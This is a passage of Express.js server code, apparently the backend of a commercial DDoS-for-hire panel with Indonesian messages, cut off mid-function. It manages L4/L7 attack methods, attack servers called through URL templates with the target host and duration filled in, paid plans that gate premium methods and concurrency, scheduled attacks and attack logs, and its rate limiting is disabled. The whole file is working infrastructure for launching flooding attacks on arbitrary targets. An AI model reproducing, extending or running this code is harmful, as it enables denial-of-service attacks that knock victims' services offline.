const express = require("express");
const cors = require("cors");
const crypto = require("crypto");
const path = require("path");
const rateLimit = require("express-rate-limit");
const jwt = require("jsonwebtoken");
const { JWT_SECRET, CORS_ORIGINS, CORS_ALLOW_ALL, SESSION_COOKIE_NAME } = require("./config");
const { db, run, get, all, withTransaction } = require("./db");
const authRoutes = require("./routes/auth");
const userRoutes = require("./routes/users");
const planRoutes = require("./routes/plans");
const newsRoutes = require("./routes/news");
const statsRoutes = require("./routes/stats");
const managerRoutes = require("./routes/manager");
const cliRoutes = require("./routes/cli");
const { authenticate, requireAdmin, issueToken } = require("./middleware/auth");
const { getActiveUserPlan } = require("./lib/plan");
const { logBalanceActivity } = require("./lib/balance");
const { generateCaptcha, validateCaptcha } = require("./lib/captcha");

const app = express();

if (!JWT_SECRET) {
  console.error("JWT_SECRET wajib di-set di environment untuk produksi.");
  process.exit(1);
}

app.use(
  cors({
    origin: CORS_ALLOW_ALL
      ? true
      : (origin, callback) => {
          // Izinkan request tanpa Origin (mis. curl/postman) atau yang ada di daftar.
          if (!origin) return callback(null, true);
          if (CORS_ORIGINS.includes(origin)) return callback(null, true);
          return callback(null, false);
        },
    credentials: true,
  }),
);
app.disable("x-powered-by");
app.use(express.json({ limit: "1mb" }));

// Mount modular routers
app.use("/api", authRoutes);
app.use("/api", userRoutes);
app.use("/api", planRoutes);
app.use("/api", newsRoutes);
app.use("/api", statsRoutes);
app.use("/api", managerRoutes);
app.use("/api/cli", cliRoutes);

const noopLimiter = (_req, _res, next) => next();
const authLimiter = noopLimiter;
const captchaLimiter = noopLimiter;

const markLogCompleted = (logId) =>
  run("UPDATE attack_logs SET status = 'completed' WHERE id = ?", [logId]).catch(() => {});

const cleanupExpiredLogs = () => {
  const now = Date.now();
  run("UPDATE attack_logs SET status = 'completed' WHERE status = 'running' AND end_at <= ?", [now]).catch(
    () => {},
  );
};

setInterval(cleanupExpiredLogs, 5000);

const processSchedules = async () => {
  const now = Date.now();
  const schedules = await new Promise((resolve) => {
    db.all(
      "SELECT id, host, method_id, time, concurrent, run_at FROM attack_schedules WHERE status = 'pending' AND run_at <= ? ORDER BY run_at ASC",
      [now],
      (err, rows) => resolve(err ? [] : rows || []),
    );
  });
  for (const sched of schedules) {
    try {
      const methodRow = await get(
        "SELECT id, name, display_name, layer, audience FROM methods WHERE id = ?",
        [sched.method_id],
      );
      if (!methodRow) {
        await run("UPDATE attack_schedules SET status = 'failed' WHERE id = ?", [sched.id]);
        continue;
      }
      const tasks = await startAttack(sched.host, sched.time, sched.concurrent, methodRow);
      await run("UPDATE attack_schedules SET status = 'executed' WHERE id = ?", [sched.id]);
      console.log("[SCHEDULE EXECUTED]", { id: sched.id, tasks: tasks.length });
    } catch (err) {
      console.error("[SCHEDULE ERROR]", { id: sched.id, error: err.message });
      await run("UPDATE attack_schedules SET status = 'failed' WHERE id = ?", [sched.id]);
    }
  }
};
setInterval(processSchedules, 10000);

app.patch("/api/profile", authLimiter, authenticate, async (req, res) => {
  const { telegramId } = req.body || {};
  const trimmed = telegramId ? String(telegramId).trim() : "";
  if (trimmed && (trimmed.length < 3 || trimmed.length > 32)) {
    return res.status(400).json({ message: "Telegram ID 3-32 karakter atau kosongkan" });
  }
  if (trimmed && !/^[0-9]+$/.test(trimmed)) {
    return res.status(400).json({ message: "Telegram ID harus angka" });
  }

  try {
    await run(
      "UPDATE users SET telegram_id = ? WHERE id = ?",
      [trimmed || null, req.user.id],
    );
    return res.json({
      message: "Profil diperbarui",
      telegramId: trimmed || null,
    });
  } catch (err) {
    console.error("Profile update error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.get("/api/methods", authLimiter, authenticate, async (req, res) => {
  try {
    const rows = await new Promise((resolve, reject) => {
      db.all(
        "SELECT id, name, display_name, layer, tier, audience, description FROM methods ORDER BY id ASC",
        [],
        (err, data) => (err ? reject(err) : resolve(data)),
      );
    });
    const list = [];
    for (const m of rows) {
      if (!req.user.isAdmin && m.audience !== "all") continue;
      const params = await getMethodParams(m.id);
      list.push({ ...m, params });
    }
    res.json({ methods: list });
  } catch (err) {
    console.error("List methods error", err);
    res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.get("/api/admin/methods", authLimiter, authenticate, requireAdmin, async (_req, res) => {
  try {
    const rows = await new Promise((resolve, reject) => {
      db.all(
        "SELECT id, name, display_name, layer, tier, audience, description, created_at FROM methods ORDER BY id ASC",
        [],
        (err, data) => (err ? reject(err) : resolve(data)),
      );
    });
    const withParams = [];
    for (const m of rows) {
      const params = await getMethodParams(m.id);
      withParams.push({ ...m, params });
    }
    res.json({ methods: withParams });
  } catch (err) {
    console.error("Admin list methods error", err);
    res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

const saveMethodParams = async (methodId, params = []) => {
  await run("DELETE FROM method_params WHERE method_id = ?", [methodId]);
  const now = new Date().toISOString();
  for (const p of params) {
    const key = String(p.param_key || p.key || "").trim();
    const label = String(p.label || "").trim() || key;
    const type = p.type || "text";
    const required = p.required ? 1 : 0;
    const placeholder = p.placeholder ? String(p.placeholder) : null;
    const defVal = p.default_value ?? p.defaultValue ?? null;
    const options = p.options ? String(p.options) : null;
    if (!key) continue;
    await run(
      "INSERT INTO method_params (method_id, param_key, label, type, required, placeholder, default_value, options, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
      [methodId, key, label, type, required, placeholder, defVal, options, now],
    );
  }
};

app.post("/api/admin/methods", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const { name, displayName, layer, tier, audience, description, params = [] } = req.body || {};
  if (!name || !displayName || !layer || !tier || !audience) {
    return res.status(400).json({ message: "Semua field wajib diisi" });
  }
  const slug = String(name).trim();
  if (!/^[A-Za-z0-9._-]{2,32}$/.test(slug)) {
    return res.status(400).json({ message: "Name 2-32 karakter huruf/angka/._- (case-sensitive)" });
  }
  const disp = String(displayName).trim();
  if (disp.length < 2 || disp.length > 40) {
    return res.status(400).json({ message: "Display name 2-40 karakter" });
  }
  if (!["L4", "L7"].includes(layer)) {
    return res.status(400).json({ message: "Layer harus L4 atau L7" });
  }
  if (!["basic", "premium"].includes(tier)) {
    return res.status(400).json({ message: "Tier harus basic/premium" });
  }
  if (!["all", "admin"].includes(audience)) {
    return res.status(400).json({ message: "Audience harus all/admin" });
  }
  const desc = (description ?? "").toString().trim() || "test";
  try {
    const existing = await get("SELECT id FROM methods WHERE name = ?", [slug]);
    if (existing) return res.status(409).json({ message: "Name sudah dipakai" });
    const now = new Date().toISOString();
    const result = await run(
      "INSERT INTO methods (name, display_name, layer, tier, audience, description, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
      [slug, disp, layer, tier, audience, desc, now],
    );
    await saveMethodParams(result.lastID, params);
    return res.status(201).json({
      message: "Method ditambahkan",
      method: { id: result.lastID, name: slug, display_name: disp, layer, tier, audience, description: desc, created_at: now, params },
    });
  } catch (err) {
    console.error("Create method error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.patch("/api/admin/methods/:id", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const methodId = Number(req.params.id);
  const { displayName, layer, tier, audience, description, params = null } = req.body || {};
  if (!Number.isInteger(methodId)) return res.status(400).json({ message: "ID tidak valid" });
  try {
    const existing = await get("SELECT id FROM methods WHERE id = ?", [methodId]);
    if (!existing) return res.status(404).json({ message: "Method tidak ditemukan" });
    const updates = {
      display: displayName ? String(displayName).trim() : null,
      layer: layer || null,
      tier: tier || null,
      audience: audience || null,
      description: description !== undefined ? String(description).trim() || "test" : null,
    };
    if (updates.display && (updates.display.length < 2 || updates.display.length > 40)) {
      return res.status(400).json({ message: "Display name 2-40 karakter" });
    }
    if (updates.layer && !["L4", "L7"].includes(updates.layer)) {
      return res.status(400).json({ message: "Layer harus L4 atau L7" });
    }
    if (updates.tier && !["basic", "premium"].includes(updates.tier)) {
      return res.status(400).json({ message: "Tier harus basic/premium" });
    }
    if (updates.audience && !["all", "admin"].includes(updates.audience)) {
      return res.status(400).json({ message: "Audience harus all/admin" });
    }
    await run(
      "UPDATE methods SET display_name = COALESCE(?, display_name), layer = COALESCE(?, layer), tier = COALESCE(?, tier), audience = COALESCE(?, audience), description = COALESCE(?, description) WHERE id = ?",
      [updates.display, updates.layer, updates.tier, updates.audience, updates.description, methodId],
    );
    if (Array.isArray(params)) {
      await saveMethodParams(methodId, params);
    }
    const updated = await getMethodWithParams(methodId);
    return res.json({ message: "Method diperbarui", method: updated });
  } catch (err) {
    console.error("Update method error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.delete("/api/admin/methods/:id", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const methodId = Number(req.params.id);
  if (!Number.isInteger(methodId)) return res.status(400).json({ message: "ID tidak valid" });
  try {
    const existing = await get("SELECT id FROM methods WHERE id = ?", [methodId]);
    if (!existing) return res.status(404).json({ message: "Method tidak ditemukan" });
    await run("DELETE FROM methods WHERE id = ?", [methodId]);
    return res.json({ message: "Method dihapus" });
  } catch (err) {
    console.error("Delete method error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

const fetchServerMethods = (serverId) =>
  new Promise((resolve, reject) => {
    db.all(
      `SELECT m.id, m.name, m.display_name, m.layer FROM server_methods sm
       JOIN methods m ON m.id = sm.method_id
       WHERE sm.server_id = ?
       ORDER BY m.id ASC`,
      [serverId],
      (err, rows) => (err ? reject(err) : resolve(rows || [])),
    );
  });

const getServerLoad = async (serverId) => {
  const row = await get(
    "SELECT COALESCE(SUM(concurrent), 0) AS load FROM attack_logs WHERE server_id = ? AND status = 'running' AND end_at > ?",
    [serverId, Date.now()],
  );
  return row?.load ? Number(row.load) : 0;
};

app.get("/api/admin/servers", authLimiter, authenticate, requireAdmin, async (_req, res) => {
  try {
    const servers = await new Promise((resolve, reject) => {
      db.all(
        "SELECT id, name, api_url, max_concurrent, max_time, layer, status, success_check_enabled, success_key, success_value, created_at FROM servers ORDER BY id ASC",
        [],
        (err, rows) => (err ? reject(err) : resolve(rows || [])),
      );
    });
    const withMethods = await Promise.all(
      servers.map(async (s) => ({
        ...s,
        methods: await fetchServerMethods(s.id),
      })),
    );
    return res.json({ servers: withMethods });
  } catch (err) {
    console.error("Admin list servers error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.post("/api/admin/servers", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const {
    name,
    apiUrl,
    maxConcurrent,
    maxTime,
    layer = "L7",
    status = "online",
    methods = [],
    successCheckEnabled = false,
    successKey = "success",
    successValue = "",
  } = req.body || {};
  const trimmedName = String(name || "").trim();
  if (!trimmedName || trimmedName.length < 3 || trimmedName.length > 50) {
    return res.status(400).json({ message: "Nama server 3-50 karakter" });
  }
  if (!apiUrl || String(apiUrl).trim().length < 5) {
    return res.status(400).json({ message: "API server wajib diisi" });
  }
  const maxConc = Number(maxConcurrent);
  const maxT = Number(maxTime);
  if (!Number.isInteger(maxConc) || maxConc < 1 || maxConc > 10000) {
    return res.status(400).json({ message: "Max concurrent 1-10000" });
  }
  if (!Number.isInteger(maxT) || maxT < 1 || maxT > 86400) {
    return res.status(400).json({ message: "Max time 1-86400 detik" });
  }
  if (!["L4", "L7"].includes(layer)) {
    return res.status(400).json({ message: "Layer harus L4 atau L7" });
  }
  if (!["online", "offline", "maintenance"].includes(status)) {
    return res.status(400).json({ message: "Status tidak valid" });
  }
  try {
    const exists = await get("SELECT id FROM servers WHERE name = ?", [trimmedName]);
    if (exists) return res.status(409).json({ message: "Nama server sudah ada" });
    const validMethods = Array.isArray(methods) ? methods.map((m) => Number(m)).filter(Number.isInteger) : [];
    const methodRows = validMethods.length
      ? await new Promise((resolve, reject) => {
          db.all(
            `SELECT id, layer FROM methods WHERE id IN (${validMethods.map(() => "?").join(",")})`,
            validMethods,
            (err, rows) => (err ? reject(err) : resolve(rows || [])),
          );
        })
      : [];
    const filtered = methodRows.filter((m) => m.layer === layer).map((m) => m.id);

    const now = new Date().toISOString();
    const result = await run(
      "INSERT INTO servers (name, api_url, max_concurrent, max_time, layer, status, success_check_enabled, success_key, success_value, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
      [
        trimmedName,
        String(apiUrl).trim(),
        maxConc,
        maxT,
        layer,
        status,
        successCheckEnabled ? 1 : 0,
        successKey ? String(successKey).trim() : null,
        successValue === undefined ? null : String(successValue),
        now,
      ],
    );
    const serverId = result.lastID;
    for (const mid of filtered) {
      await run("INSERT OR IGNORE INTO server_methods (server_id, method_id) VALUES (?, ?)", [serverId, mid]);
    }
    const serverMethods = await fetchServerMethods(serverId);
    return res.status(201).json({
      message: "Server ditambahkan",
      server: {
        id: serverId,
        name: trimmedName,
        api_url: String(apiUrl).trim(),
        max_concurrent: maxConc,
        max_time: maxT,
        layer,
        status,
        created_at: now,
        methods: serverMethods,
      },
    });
  } catch (err) {
    console.error("Create server error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.patch("/api/admin/servers/:id", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const serverId = Number(req.params.id);
  if (!Number.isInteger(serverId)) return res.status(400).json({ message: "ID tidak valid" });
  const { name, apiUrl, maxConcurrent, maxTime, layer, status, methods, successCheckEnabled, successKey, successValue } =
    req.body || {};
  try {
    const current = await get(
      "SELECT id, name, api_url, max_concurrent, max_time, layer, status, success_check_enabled, success_key, success_value FROM servers WHERE id = ?",
      [serverId],
    );
    if (!current) return res.status(404).json({ message: "Server tidak ditemukan" });

    const nextName = name !== undefined ? String(name).trim() : current.name;
    if (nextName.length < 3 || nextName.length > 50) {
      return res.status(400).json({ message: "Nama server 3-50 karakter" });
    }
    if (nextName !== current.name) {
      const conflict = await get("SELECT id FROM servers WHERE name = ?", [nextName]);
      if (conflict) return res.status(409).json({ message: "Nama server sudah ada" });
    }
    const nextApi = apiUrl !== undefined ? String(apiUrl).trim() : current.api_url;
    if (!nextApi || nextApi.length < 5) {
      return res.status(400).json({ message: "API server wajib diisi" });
    }
    const nextLayer = layer || current.layer;
    if (!["L4", "L7"].includes(nextLayer)) {
      return res.status(400).json({ message: "Layer harus L4 atau L7" });
    }
    const nextStatus = status || current.status;
    if (!["online", "offline", "maintenance"].includes(nextStatus)) {
      return res.status(400).json({ message: "Status tidak valid" });
    }
    const nextMaxConcurrent =
      maxConcurrent !== undefined ? Number(maxConcurrent) : current.max_concurrent;
    const nextMaxTime = maxTime !== undefined ? Number(maxTime) : current.max_time;
    if (!Number.isInteger(nextMaxConcurrent) || nextMaxConcurrent < 1 || nextMaxConcurrent > 10000) {
      return res.status(400).json({ message: "Max concurrent 1-10000" });
    }
    if (!Number.isInteger(nextMaxTime) || nextMaxTime < 1 || nextMaxTime > 86400) {
      return res.status(400).json({ message: "Max time 1-86400 detik" });
    }

    await run(
      "UPDATE servers SET name = ?, api_url = ?, max_concurrent = ?, max_time = ?, layer = ?, status = ?, success_check_enabled = COALESCE(?, success_check_enabled), success_key = COALESCE(?, success_key), success_value = COALESCE(?, success_value) WHERE id = ?",
      [
        nextName,
        nextApi,
        nextMaxConcurrent,
        nextMaxTime,
        nextLayer,
        nextStatus,
        successCheckEnabled === undefined ? null : successCheckEnabled ? 1 : 0,
        successKey === undefined ? null : String(successKey).trim() || null,
        successValue === undefined ? null : String(successValue),
        serverId,
      ],
    );

    if (methods !== undefined) {
      const methodIds = Array.isArray(methods) ? methods.map((m) => Number(m)).filter(Number.isInteger) : [];
      await run("DELETE FROM server_methods WHERE server_id = ?", [serverId]);
      if (methodIds.length) {
        const rows = await new Promise((resolve, reject) => {
          db.all(
            `SELECT id, layer FROM methods WHERE id IN (${methodIds.map(() => "?").join(",")})`,
            methodIds,
            (err, data) => (err ? reject(err) : resolve(data || [])),
          );
        });
        const filtered = rows.filter((m) => m.layer === nextLayer).map((m) => m.id);
        for (const mid of filtered) {
          await run("INSERT OR IGNORE INTO server_methods (server_id, method_id) VALUES (?, ?)", [serverId, mid]);
        }
      }
    }

    const methodsList = await fetchServerMethods(serverId);
    return res.json({
      message: "Server diperbarui",
      server: {
        id: serverId,
        name: nextName,
        api_url: nextApi,
        max_concurrent: nextMaxConcurrent,
        max_time: nextMaxTime,
        layer: nextLayer,
        status: nextStatus,
        success_check_enabled: successCheckEnabled === undefined ? current.success_check_enabled : successCheckEnabled ? 1 : 0,
        success_key: successKey === undefined ? current.success_key : String(successKey).trim() || null,
        success_value: successValue === undefined ? current.success_value : String(successValue),
        methods: methodsList,
      },
    });
  } catch (err) {
    console.error("Update server error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

app.delete("/api/admin/servers/:id", authLimiter, authenticate, requireAdmin, async (req, res) => {
  const serverId = Number(req.params.id);
  if (!Number.isInteger(serverId)) return res.status(400).json({ message: "ID tidak valid" });
  try {
    const existing = await get("SELECT id FROM servers WHERE id = ?", [serverId]);
    if (!existing) return res.status(404).json({ message: "Server tidak ditemukan" });
    await run("DELETE FROM servers WHERE id = ?", [serverId]);
    return res.json({ message: "Server dihapus" });
  } catch (err) {
    console.error("Delete server error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

const sanitizeTask = (task) => ({
  id: task.id,
  host: task.host,
  methodName: task.methodName,
  displayName: task.displayName,
  serverName: task.serverName,
  endsAt: task.endsAt,
  time: task.time,
  status: task.status,
  startAt: task.startAt,
  concurrent: task.concurrent ?? 1,
});

const getMethodParams = (methodId) =>
  new Promise((resolve, reject) => {
    db.all(
      "SELECT id, param_key, label, type, required, placeholder, default_value, options FROM method_params WHERE method_id = ? ORDER BY id ASC",
      [methodId],
      (err, rows) => (err ? reject(err) : resolve(rows || [])),
    );
  });

const getMethodWithParams = async (id) => {
  const method = await get(
    "SELECT id, name, display_name, layer, tier, audience, description FROM methods WHERE id = ?",
    [id],
  );
  if (!method) return null;
  const params = await getMethodParams(id);
  return { ...method, params };
};

const getOngoingTasks = () =>
  new Promise((resolve, reject) => {
    db.all(
      `SELECT l.id, l.host, l.method_id, l.server_id, l.start_at, l.end_at, l.time, l.concurrent, l.status,
              m.display_name, m.name as method_name,
              s.name as server_name
       FROM attack_logs l
       JOIN methods m ON m.id = l.method_id
       JOIN servers s ON s.id = l.server_id
       WHERE l.status = 'running' AND l.end_at > ?
       ORDER BY l.start_at DESC`,
      [Date.now()],
      (err, rows) => {
        if (err) return reject(err);
        const tasks = (rows || []).map((r) => ({
          id: r.id,
          host: r.host,
          methodName: r.method_name,
          displayName: r.display_name,
          serverName: r.server_name,
          endsAt: r.end_at,
          time: r.time,
          status: r.status,
          startAt: r.start_at,
          concurrent: r.concurrent,
        }));
        resolve(tasks);
      },
    );
  });

const selectServersForMethod = async (methodId, layer, needed) => {
  const rows = await new Promise((resolve, reject) => {
    db.all(
      `SELECT s.id, s.name, s.api_url, s.max_concurrent, s.max_time, s.layer, s.status,
              s.success_check_enabled, s.success_key, s.success_value
       FROM servers s
       JOIN server_methods sm ON sm.server_id = s.id
       WHERE sm.method_id = ? AND s.layer = ? AND s.status = 'online'
       ORDER BY s.id ASC`,
      [methodId, layer],
      (err, data) => (err ? reject(err) : resolve(data || [])),
    );
  });
  if (!rows.length) return [];
  const enriched = [];
  for (const srv of rows) {
    const load = await getServerLoad(srv.id);
    const available = Math.max(srv.max_concurrent - load, 0);
    if (available > 0) {
      enriched.push({ ...srv, load, available });
    }
  }
  enriched.sort((a, b) => a.load - b.load);
  let remaining = needed;
  const picks = [];
  for (const srv of enriched) {
    if (remaining <= 0) break;
    const take = Math.min(srv.available, remaining);
    if (take > 0) {
      picks.push({ ...srv, take, available: srv.available });
      remaining -= take;
    }
  }
  return picks;
};

const getScheduledTasks = () =>
  new Promise((resolve, reject) => {
    db.all(
      `SELECT s.id, s.host, s.method_id, s.time, s.concurrent, s.run_at, m.display_name, m.name as method_name, m.layer
       FROM attack_schedules s
       JOIN methods m ON m.id = s.method_id
       WHERE s.status = 'pending' AND s.run_at > ?
       ORDER BY s.run_at ASC`,
      [Date.now()],
      (err, rows) => {
        if (err) return reject(err);
        const tasks = (rows || []).map((r) => ({
          id: r.id,
          host: r.host,
          methodName: r.method_name,
          displayName: r.display_name,
          serverName: "-",
          endsAt: r.run_at + r.time * 1000,
          time: r.time,
          status: "scheduled",
          startAt: r.run_at,
          concurrent: r.concurrent,
        }));
        resolve(tasks);
      },
    );
  });

app.get("/api/panel/ongoing", authLimiter, authenticate, (req, res) => {
  cleanupExpiredLogs();
  Promise.all([getOngoingTasks(), getScheduledTasks(), getActiveUserPlan(req.user.id)])
    .then(([running, scheduled, plan]) => {
      const maxConcurrent = plan?.maxConcurrent ?? null;
      res.json({ tasks: [...scheduled, ...running], maxConcurrent });
    })
    .catch((err) => {
      console.error("List ongoing error", err);
      return res.status(500).json({ message: "Terjadi kesalahan server" });
    });
});

app.get("/api/panel/stats", authLimiter, async (_req, res) => {
  cleanupExpiredLogs();
  try {
    const now = Date.now();
    const totalRow = await get("SELECT COUNT(*) AS total FROM attack_logs", []);
    const runningRow = await get(
      "SELECT COUNT(*) AS running FROM attack_logs WHERE status = 'running' AND end_at > ?",
      [now],
    );
    return res.json({
      total: totalRow?.total ? Number(totalRow.total) : 0,
      running: runningRow?.running ? Number(runningRow.running) : 0,
    });
  } catch (err) {
    console.error("Stats panel error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

// moved to routes/stats.js

const startAttack = async (host, requestedTime, concurrentNum, methodRow, paramsMap = {}) => {
  const selectedServers = await selectServersForMethod(methodRow.id, methodRow.layer, concurrentNum);
  if (!selectedServers.length) {
    throw new Error("Tidak ada server tersedia untuk method ini");
  }
  const totalAvailable = selectedServers.reduce((sum, s) => sum + (s.available || 0), 0);
  if (totalAvailable < concurrentNum) {
    throw new Error(`Server penuh, tersedia ${totalAvailable} slot dari ${concurrentNum}`);
  }
  const maxTimeLimit = Math.min(...selectedServers.map((s) => s.max_time));
  const finalTime = Math.min(requestedTime, maxTimeLimit);
  const tasks = [];
  const failures = [];
  const now = Date.now();
  const replaceToken = (tpl, key, value) => tpl.replace(new RegExp(`\\[${key}\\]`, "g"), value);
  const checkResponse = (srv, status, body) => {
    if (srv.success_check_enabled) {
      try {
        const parsed = JSON.parse(body || "{}");
        const key = srv.success_key || "success";
        const val = parsed?.[key];
        if (srv.success_value === null || srv.success_value === undefined || srv.success_value === "") {
          return Boolean(val);
        }
        return String(val) === String(srv.success_value);
      } catch {
        return false;
      }
    }
    return status >= 200 && status < 300;
  };

  for (const srv of selectedServers) {
    const { take } = srv;
    const endsAt = now + finalTime * 1000;
    let url = replaceToken(
      replaceToken(replaceToken(srv.api_url, "host", encodeURIComponent(host.trim())), "time", String(finalTime)),
      "method",
      encodeURIComponent(methodRow.name),
    );
    for (const [k, v] of Object.entries(paramsMap)) {
      url = replaceToken(url, k, encodeURIComponent(String(v)));
    }
    for (let i = 0; i < take; i++) {
      const taskId = crypto.randomUUID();
      try {
        const resp = await fetch(url);
        const body = await resp.text().catch(() => "");
        console.log("[PANEL SEND]", {
          url,
          status: resp.status,
          server: srv.name,
          method: methodRow.name,
          body: body.slice(0, 200),
        });
        const success = checkResponse(srv, resp.status, body);
        if (!success) {
          failures.push({ server: srv.name, status: resp.status });
          continue;
        }
        const task = {
          id: taskId,
          host: host.trim(),
          methodName: methodRow.name,
          displayName: methodRow.display_name,
          serverName: srv.name,
          serverId: srv.id,
          endsAt,
          time: finalTime,
          status: "running",
          startAt: now,
          concurrent: 1,
        };
        tasks.push(task);
        await run(
          "INSERT INTO attack_logs (id, host, method_id, server_id, start_at, end_at, time, concurrent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running', ?)",
          [taskId, host.trim(), methodRow.id, srv.id, now, endsAt, finalTime, 1, new Date().toISOString()],
        );
        setTimeout(() => {
          markLogCompleted(taskId);
        }, finalTime * 1000);
      } catch (err) {
        failures.push({ server: srv.name, status: "fetch_error" });
        console.error("[PANEL SEND ERROR]", { url, server: srv.name, method: methodRow.name, error: err.message });
      }
    }
  }

  if (!tasks.length) {
    const msg =
      failures.length > 0
        ? `Server bermasalah, tidak ada request yang berhasil (status: ${failures
            .map((f) => `${f.server}:${f.status}`)
            .join(", ")})`
        : "Server bermasalah, request gagal";
    const error = new Error(msg);
    error.code = 502;
    throw error;
  }
  return tasks;
};

app.post("/api/panel/run", authLimiter, authenticate, async (req, res) => {
  const { host, time, concurrent = 1, methodId, scheduledAt, params: inputParams = {} } = req.body || {};
  if (!host || typeof host !== "string" || host.trim().length < 3) {
    return res.status(400).json({ message: "Host wajib diisi" });
  }
  const methodNum = Number(methodId);
  if (!Number.isInteger(methodNum)) {
    return res.status(400).json({ message: "Method tidak valid" });
  }
  const requestedTime = Number(time);
  if (!Number.isInteger(requestedTime) || requestedTime < 1 || requestedTime > 86400) {
    return res.status(400).json({ message: "Time 1-86400 detik" });
  }
  const concurrentNum = Number(concurrent);
  if (!Number.isInteger(concurrentNum) || concurrentNum < 1 || concurrentNum > 1000) {
    return res.status(400).json({ message: "Concurrent 1-1000" });
  }
  try {
    const activePlan = await getActiveUserPlan(req.user.id);
    if (!activePlan) return res.status(403).json({ message: "Plan diperlukan" });
    const methodRow = await getMethodWithParams(methodNum);
    if (!methodRow) return res.status(404).json({ message: "Method tidak ditemukan" });
    if (methodRow.audience === "admin" && !req.user.isAdmin) {
      return res.status(403).json({ message: "Method khusus admin" });
    }
    if (methodRow.tier === "premium" && !activePlan.premiumAccess) {
      return res.status(403).json({ message: "Plan tidak mengizinkan method premium" });
    }

    const paramsMap = {};
    for (const p of methodRow.params || []) {
      const key = p.param_key || p.key;
      let val = inputParams[key];
      if (val === undefined || val === null || val === "") {
        if (p.default_value !== null && p.default_value !== undefined && p.default_value !== "") {
          val = p.default_value;
        }
      }
      if ((val === undefined || val === null || val === "") && p.required) {
        return res.status(400).json({ message: `Parameter ${key} wajib diisi` });
      }
      if (val === undefined || val === null || val === "") continue;
      if (p.type === "number") {
        const num = Number(val);
        if (!Number.isFinite(num)) return res.status(400).json({ message: `Parameter ${key} harus angka` });
        val = num;
      } else if (p.type === "checkbox") {
        val = Boolean(val);
      } else if (p.type === "select" && p.options) {
        const opts = p.options.split(",").map((o) => o.trim()).filter(Boolean);
        if (opts.length && !opts.includes(String(val))) {
          return res.status(400).json({ message: `Parameter ${key} tidak valid` });
        }
      } else {
        val = String(val);
      }
      paramsMap[key] = val;
    }

    if (scheduledAt) {
      const runAt = Number(scheduledAt);
      if (!Number.isInteger(runAt) || runAt <= Date.now()) {
        return res.status(400).json({ message: "Jadwal harus waktu di masa depan" });
      }
      const maxFuture = Date.now() + 30 * 24 * 60 * 60 * 1000;
      if (runAt > maxFuture) return res.status(400).json({ message: "Jadwal maksimal 30 hari ke depan" });

      const cappedConcurrent = Math.min(concurrentNum, activePlan.maxConcurrent || concurrentNum);
      const servers = await selectServersForMethod(methodRow.id, methodRow.layer, cappedConcurrent);
      if (!servers.length) return res.status(503).json({ message: "Tidak ada server tersedia untuk method ini" });
      const totalCap = servers.reduce((sum, s) => sum + (s.available || 0), 0);
      if (totalCap < cappedConcurrent) {
        return res
          .status(503)
          .json({ message: `Server penuh, tersedia ${totalCap} slot dari ${cappedConcurrent}` });
      }
      const scheduleId = crypto.randomUUID();
      await run(
        "INSERT INTO attack_schedules (id, host, method_id, time, concurrent, run_at, status, created_at) VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)",
        [scheduleId, host.trim(), methodRow.id, Math.min(requestedTime, activePlan.maxTime), cappedConcurrent, runAt, new Date().toISOString()],
      );
      return res.json({
        message: "Dijadwalkan",
        tasks: [
          sanitizeTask({
            id: scheduleId,
            host: host.trim(),
            methodName: methodRow.name,
            displayName: methodRow.display_name,
            serverName: "-",
            endsAt: runAt + Math.min(requestedTime, activePlan.maxTime) * 1000,
            time: Math.min(requestedTime, activePlan.maxTime),
            status: "scheduled",
            concurrent: cappedConcurrent,
            startAt: runAt,
            params: paramsMap,
          }),
        ],
      });
    }

    const cappedTime = Math.min(requestedTime, activePlan.maxTime);
    const cappedConcurrent = Math.min(concurrentNum, activePlan.maxConcurrent || 0);
    if (cappedConcurrent <= 0) {
      return res.status(403).json({ message: "Plan tidak mengizinkan concurrent" });
    }
    const tasks = await startAttack(host, cappedTime, cappedConcurrent, methodRow, paramsMap);
    return res.json({ message: "Dikirim", tasks: tasks.map((t) => sanitizeTask(t)) });
  } catch (err) {
    console.error("Run panel error", err);
    const code = err.code === 502 ? 502 : 500;
    return res.status(code).json({ message: err.message || "Terjadi kesalahan server" });
  }
});

app.get("/api/panel/stream", (req, res) => {
  const token =
    req.query.token ||
    (req.headers.cookie || "")
      .split(";")
      .map((c) => c.trim().split("="))
      .reduce((acc, [k, v]) => ({ ...acc, [k]: v }), {})[SESSION_COOKIE_NAME];
  if (!token) return res.status(401).end();
  try {
    const payload = jwt.verify(String(token), JWT_SECRET);
    if (!payload?.id) return res.status(401).end();
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
      "Access-Control-Allow-Origin": "*",
    });
    const send = async () => {
      cleanupExpiredLogs();
      try {
        const tasks = await getOngoingTasks();
        res.write(`data: ${JSON.stringify({ tasks })}\n\n`);
      } catch (err) {
        // ignore errors in stream
      }
    };
    send();
    const iv = setInterval(send, 3000);
    req.on("close", () => clearInterval(iv));
  } catch {
    return res.status(401).end();
  }
});

app.post("/api/panel/stop", authLimiter, authenticate, async (req, res) => {
  const { taskId } = req.body || {};
  if (!taskId) return res.status(400).json({ message: "ID tidak valid" });
  try {
    const log = await get(
